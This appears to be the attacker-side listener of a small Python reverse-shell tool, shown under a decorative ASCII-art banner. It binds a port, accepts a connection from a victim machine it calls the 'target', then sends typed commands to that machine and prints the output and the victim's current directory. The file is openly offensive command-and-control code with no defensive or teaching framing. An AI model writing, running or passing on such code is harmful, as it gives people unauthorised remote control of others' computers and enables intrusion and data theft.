import socket
from colorama.ansi import Fore
from colorama.initialise import init
from os import system
system("cls")
print(Fore.GREEN+"""
     sSSsawd    .S    S.    .S  S.      S.        sSSs   .S_sSSs    
    d%%SPsadw   .SS    SS.  .SS  SS.     SS.      d%%SP  .SS~YS%%b   
   d%S'     s   S%S    S&S  S%S  S%S     S%S     d%S'    S%S   `S%b  
   S%|          S%S    d*S  S%S  S%S     S%S     S%S     S%S    S%S  
   S&S          S&S   .S*S  S&S  S&S     S&S     S&S     S%S    d*S  
    Y&Ss        S&S_sdSSS   S&S  S&S     S&S     S&S_Ss  S&S   .S*S  
    `S&&S       S&S~YSSY%b  S&S  S&S     S&S     S&S~SP  S&S_sdSSS   
      `S*S      S&S    `S%  S&S  S&S     S&S     S&S     S&S~YSY%b   
d      l*S      S*S     S%  S*S  S*b     S*b     S*b     S*S   `S%b  
s0    .S*P      S*S     S&  S*S  S*S.    S*S.    S*S.    S*S    S%S  
xassssSS*       S*S     S&  S*S   SSSbs   SSSbs   SSSbs  S*S    S&S  
 asYSS'         S*S     SS  S*S    YSSP    YSSP    YSSP  S*S    SSS  
                SP          SP                           SP          
                Y           Y                            Y           
                                                                                                                                                                                                                                                                                                 
""")
init()

sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
print(Fore.RED+"\n !!if you want set this default press (enter)!!\n".title())
print(Fore.GREEN)
ip = input("\n get your system ip : ".upper())
if ip == None :
    ip = ""
else :
    pass
print(Fore.BLUE)
port = input("\n get your port : ".upper())
port = int(port)
sock.bind((ip,port))

sock.listen()

c, addr = sock.accept()
c.settimeout(3)

location = "" # get file location on your target system
while True:
    if location == "" :
      location = "start"
    else:
        pass
    print(Fore.BLUE)
    command = input(location+Fore.GREEN+" >> ") 
    
    if command == "exit":
        c.send(b"exit")
        sock.close()
        break
    c.send(command.encode())

    try:
        data = c.recv(99999).decode()
        location = c.recv(99999).decode()
 
        print(Fore.YELLOW + data)
    except:
        pass
